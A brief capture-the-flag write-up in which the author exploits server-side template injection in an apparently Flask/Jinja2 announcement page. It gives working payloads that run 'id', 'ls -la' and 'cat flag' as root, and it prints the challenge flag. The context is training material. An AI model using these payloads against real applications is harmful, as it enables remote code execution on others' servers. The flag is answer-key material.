Simple page that allows 'announcements'. These announcements are then repeated back.  

Title kind of hints to server side tremplate injection.  

Use of {7 * 7} returns '{7 * 7}' but '{{7 * 7}}' returns '49'. Find this blog by onsecurity.  

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/  

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} returns 'uid=0(root) gid=0(root) groups=0(root)'  

Looks like I can pas sinformation in through using Python. I'm assumign this is a Flask app.

Running "{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}" returns requirements.txt and flag

Sending "{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}" returns  

#### picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}  
